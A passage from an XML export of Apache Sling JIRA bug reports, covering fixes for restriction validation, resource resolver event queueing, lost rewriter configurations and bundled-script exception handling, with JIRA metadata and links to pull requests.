                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="2400">40m</timespent>
                                <comments>
                            <comment id="17544169" author="joerghoh" created="Tue, 31 May 2022 07:08:00 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-event/pull/21&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-event/pull/21&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 21 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z12r7k:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11340] Custom restriction fails validation during modifyAce call</title>
                <link>https://issues.apache.org/jira/browse/SLING-11340</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The validation that is checking the posted restriction name is failing for any custom restriction.&#160; (for example from &lt;a href=&quot;https://sling.apache.org/documentation/bundles/sling-oak-restrictions.html&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;sling-oak-restrictions&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;This is happening because the ModifyAce (and related) code is only binding to a single RestrictionProvider component.&#160; There may be multiple RestrictionProvider components available, so the validation should be checking them all for a match.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13446441">SLING-11340</key>
            <summary>Custom restriction fails validation during modifyAce call</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="enorman">Eric Norman</assignee>
                                    <reporter username="enorman">Eric Norman</reporter>
                        <labels>
                    </labels>
                <created>Mon, 23 May 2022 18:41:08 +0000</created>
                <updated>Fri, 18 Nov 2022 01:15:37 +0000</updated>
                            <resolved>Sun, 29 May 2022 20:55:02 +0000</resolved>
                                                    <fixVersion>JCR Jackrabbit Access Manager 3.1.0</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="3000">50m</timespent>
                                <comments>
                            <comment id="17543724" author="enorman" created="Sun, 29 May 2022 20:55:02 +0000"  >&lt;p&gt;Merged PR #14 at: &#160;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-jackrabbit-accessmanager/commit/6be4f1712eca50d4cc5ea1514efbd1fd7e98cb6d&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;&lt;tt&gt;6be4f17&lt;/tt&gt;&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 21 weeks, 3 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z12m80:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11331] resource resolver: events need to be queued until vanity path loading is complete</title>
                <link>https://issues.apache.org/jira/browse/SLING-11331</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Events that occur while the vanith path init runs might be processed out of sequence.&lt;/p&gt;

&lt;p&gt;Proposal: queue and replay them once the init has ended.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13446217">SLING-11331</key>
            <summary>resource resolver: events need to be queued until vanity path loading is complete</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="reschke">Julian Reschke</reporter>
                        <labels>
                    </labels>
                <created>Sun, 22 May 2022 09:41:20 +0000</created>
                <updated>Fri, 27 May 2022 05:51:33 +0000</updated>
                            <resolved>Mon, 23 May 2022 10:57:45 +0000</resolved>
                                    <version>Resource Resolver 1.8.6</version>
                                    <fixVersion>Resource Resolver 1.9.0</fixVersion>
                                    <component>ResourceResolver</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17540593" author="reschke" created="Sun, 22 May 2022 13:18:47 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/66&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/66&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17540894" author="cziegeler" created="Mon, 23 May 2022 10:57:45 +0000"  >&lt;p&gt;Thanks for the PR and the updates, its applied&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10032">
                    <name>Blocker</name>
                                            <outwardlinks description="blocks">
                                        <issuelink>
            <issuekey id="13446181">SLING-11329</issuekey>
        </issuelink>
                            </outwardlinks>
                                                                <inwardlinks description="is blocked by">
                                        <issuelink>
            <issuekey id="13446182">SLING-11330</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 22 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z12ku8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11317] Rewriter configuration gets &quot;lost&quot; in ProcessorManagerImpl when package with another configuration gets deployed</title>
                <link>https://issues.apache.org/jira/browse/SLING-11317</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;On our AEM 6.5 instance (org.apache.sling.rewriter-1.2.2, but nothing major happened with this class since this version) we have multiple rewriter configurations and sometimes after a deployment of another package with a rewriter configuration, a configurations is not triggered anymore and the instance has to be restarted to get it working again.&lt;br/&gt;
I&apos;ve tracked the issue down and found the issue lies in the &lt;tt&gt;ProcessorManagerImpl&lt;/tt&gt; &lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt;. There are two fields, &lt;tt&gt;processors&lt;/tt&gt; and &lt;tt&gt;orderedProcessor&lt;/tt&gt;, which are supposed to be mostly (inactive configs are not in the &lt;tt&gt;orderedProcessors&lt;/tt&gt;) &quot;in sync&quot;, which is important because later on there is an &lt;tt&gt;updateProcessor&lt;/tt&gt; method &lt;span class=&quot;error&quot;&gt;&amp;#91;2&amp;#93;&lt;/span&gt;, where the updated config has to be found in the &lt;tt&gt;processors&lt;/tt&gt; field, but they diverge from the start, in the addProcessor &lt;span class=&quot;error&quot;&gt;&amp;#91;1&amp;#93;&lt;/span&gt; method, the added config never reaches the &lt;tt&gt;processors&lt;/tt&gt; field, because the newConfigs local variable never gets added to the processors field. This lead to the issue, that in the updateProcessor method, which gets triggered through the ResourceChangeListener, a configuration gets wrongfully deleted &lt;span class=&quot;error&quot;&gt;&amp;#91;3&amp;#93;&lt;/span&gt;.&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt; &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-rewriter/blob/master/src/main/java/org/apache/sling/rewriter/impl/ProcessorManagerImpl.java&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-rewriter/blob/master/src/main/java/org/apache/sling/rewriter/impl/ProcessorManagerImpl.java&lt;/a&gt;&lt;br/&gt;
&lt;span class=&quot;error&quot;&gt;&amp;#91;1&amp;#93;&lt;/span&gt; &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-rewriter/blob/master/src/main/java/org/apache/sling/rewriter/impl/ProcessorManagerImpl.java#L240&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-rewriter/blob/master/src/main/java/org/apache/sling/rewriter/impl/ProcessorManagerImpl.java#L240&lt;/a&gt;&lt;br/&gt;
&lt;span class=&quot;error&quot;&gt;&amp;#91;2&amp;#93;&lt;/span&gt; &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-rewriter/blob/master/src/main/java/org/apache/sling/rewriter/impl/ProcessorManagerImpl.java#L299&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-rewriter/blob/master/src/main/java/org/apache/sling/rewriter/impl/ProcessorManagerImpl.java#L299&lt;/a&gt;&lt;br/&gt;
&lt;span class=&quot;error&quot;&gt;&amp;#91;3&amp;#93;&lt;/span&gt; &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-rewriter/blob/master/src/main/java/org/apache/sling/rewriter/impl/ProcessorManagerImpl.java#L378&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-rewriter/blob/master/src/main/java/org/apache/sling/rewriter/impl/ProcessorManagerImpl.java#L378&lt;/a&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13444564">SLING-11317</key>
            <summary>Rewriter configuration gets &quot;lost&quot; in ProcessorManagerImpl when package with another configuration gets deployed</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="schulm">Martin Schulze</reporter>
                        <labels>
                    </labels>
                <created>Thu, 12 May 2022 09:25:21 +0000</created>
                <updated>Thu, 29 Sep 2022 07:33:21 +0000</updated>
                            <resolved>Wed, 25 May 2022 13:12:49 +0000</resolved>
                                                    <fixVersion>Rewriter 1.3.4</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="11400">3h 10m</timespent>
                                <comments>
                            <comment id="17536005" author="kwin" created="Thu, 12 May 2022 09:29:17 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=schulm&quot; class=&quot;user-hover&quot; rel=&quot;schulm&quot;&gt;schulm&lt;/a&gt; Thanks for the report. Can you come up with a PR containing the fix and in the best case a test case for that behaviour?&lt;/p&gt;</comment>
                            <comment id="17536434" author="JIRAUSER282297" created="Fri, 13 May 2022 05:40:53 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; I will provide a PR.&lt;/p&gt;</comment>
                            <comment id="17540149" author="JIRAUSER282297" created="Fri, 20 May 2022 14:46:38 +0000"  >&lt;p&gt;PR: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-rewriter/pull/7/files&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-rewriter/pull/7/files&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; Would you have a look?&lt;/p&gt;</comment>
                            <comment id="17542045" author="kwin" created="Wed, 25 May 2022 13:12:49 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-rewriter/commit/9677fa68d4c86d75f86fa44dcffeea0a66e3b02c&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-rewriter/commit/9677fa68d4c86d75f86fa44dcffeea0a66e3b02c&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=schulm&quot; class=&quot;user-hover&quot; rel=&quot;schulm&quot;&gt;schulm&lt;/a&gt; Thanks a lot for the contribution.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 22 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z12ao8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11307] Different exception passed to error handler  with bundled scripts</title>
                <link>https://issues.apache.org/jira/browse/SLING-11307</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;At least for JSPs, different exceptions are passed to the error handler if bundled scripts are used. &lt;br/&gt;
Example: if a NullPointerException is thrown, the NPE is passed to the error handler for repository based scripts - which is correct. For bundled scripts a ServletException is passed to the error handler - which is not correct&lt;/p&gt;</description>
                <environment></environment>
        <key id="13443925">SLING-11307</key>
            <summary>Different exception passed to error handler  with bundled scripts</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="cziegeler">Carsten Ziegeler</reporter>
                        <labels>
                    </labels>
                <created>Mon, 9 May 2022 07:53:56 +0000</created>
                <updated>Sat, 14 May 2022 06:58:58 +0000</updated>
                            <resolved>Mon, 9 May 2022 10:37:04 +0000</resolved>
                                    <version>Servlets Resolver 2.9.4</version>
                    <version>Scripting Core 2.4.6</version>
                                    <fixVersion>Scripting Core 2.4.8</fixVersion>
                    <fixVersion>Servlets Resolver 2.9.6</fixVersion>
                                    <component>Scripting</component>
                    <component>Servlets</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17533744" author="cziegeler" created="Mon, 9 May 2022 10:37:04 +0000"  >&lt;p&gt;I added the same exception handling to the bundled servlet as the default script servlet is using.&lt;br/&gt;
It is a little bit unfortunate that we have two different code paths here, as we need to keep the behaviour in sync.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-servlets-resolver/commit/bf17678d4d245bd0cba39c9bc2eba3acbb6bd57d&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-servlets-resolver/commit/bf17678d4d245bd0cba39c9bc2eba3acbb6bd57d&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17533798" author="cziegeler" created="Mon, 9 May 2022 13:14:57 +0000"  >&lt;p&gt;Removed unnecessary wrapping in servlets resolver and scripting core:&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-servlets-resolver/commit/ab9565bd709741979f136f07a8321033299a1543&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-servlets-resolver/commit/ab9565bd709741979f136f07a8321033299a1543&lt;/a&gt;&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-scripting-core/commit/c9f444f6a621c4b63c978f3189aee55dbcbb9e4b&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-scripting-core/commit/c9f444f6a621c4b63c978f3189aee55dbcbb9e4b&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 24 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z126s8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11301] Servlet.destroy never called for bundled scripts</title>
                <link>https://issues.apache.org/jira/browse/SLING-11301</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;For bundled jsp, the destroy method is never called. Though this might be an edge case , it is violating the JSP / servlet specification&lt;/p&gt;</description>
                <environment></environment>
        <key id="13443626">SLING-11301</key>
            <summary>Servlet.destroy never called for bundled scripts</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="cziegeler">Carsten Ziegeler</reporter>
                        <labels>
                    </labels>
                <created>Fri, 6 May 2022 12:45:38 +0000</created>
                <updated>Sat, 14 May 2022 06:57:49 +0000</updated>
